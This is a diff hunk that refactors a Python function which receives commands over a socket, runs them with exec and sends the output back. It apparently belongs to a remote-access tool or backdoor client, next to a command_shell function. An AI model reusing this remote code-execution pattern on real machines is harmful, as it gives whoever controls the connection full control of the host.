@@ -272,28 +272,28 @@ def command_shell():
         send(bytData)  # send output
 
 def python_interpreter():
-    send(b'received')
-    while 1:
-        command = recv(intBuff).decode()
-        if command == 'exit':
-            send(b'exiting')
+    send(str.encode("received"))
+    while True:
+        strCommand = recv(intBuff).decode("utf-8")
+        if strCommand == "exit":
+            send(str.encode("exiting"))
             break
         old_stdout = sys.stdout
         redirected_output = sys.stdout = StringIO()
         try:
-            exec(command)
-            print('')
-            error = None
+            exec(strCommand)
+            print("")
+            strError = None
         except Exception as e:
-            error = f"{e.__class__.__name__}: "
+            strError = f"{e.__class__.__name__}: "
             try:
-                error += f"{e.args[0]}"
+                strError += f"{e.args[0]}"
             except:
                 pass
         finally:
             sys.stdout = old_stdout
-        if error:
-            send(error.encode())
+        if strError:
+            send(strError.encode())
         else:
             send(redirected_output.getvalue().encode())
 
